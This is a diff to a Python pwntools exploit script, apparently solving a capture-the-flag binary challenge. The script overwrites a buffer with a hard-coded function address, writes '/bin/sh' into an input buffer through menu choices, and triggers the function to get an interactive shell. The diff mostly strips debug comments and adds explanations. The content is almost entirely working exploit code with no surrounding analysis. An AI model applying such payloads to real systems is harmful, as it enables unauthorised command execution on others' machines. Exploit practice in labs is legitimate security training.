@@ -26,30 +26,21 @@ def main():
     global r
 
     execute = 0x00000000004011ad
-  
+
+    # write execute address into buffer user_input
     payload = p64(execute) * 10
     payload += b"A" * (100 - len(payload) -1 )
     payload +=b'\n'
-    
-    r = conn()
 
-    # rep = r.recv()
-    # print(rep) 
+    r = conn()
 
     r.send(payload)
 
-    # rep = r.recv()
-    # print(rep)
- 
+    # write commande into buffer input_buffer
     r.send(b'1\n')
-
-    # rep = r.recv()
-    # print(rep)
-
     r.send(b'/bin/sh\x00\n')
-    # rep = r.recv()
-    # print(rep)
 
+    # call execute(input_buffer)
     r.send(b'4\n')
     r.interactive()
 
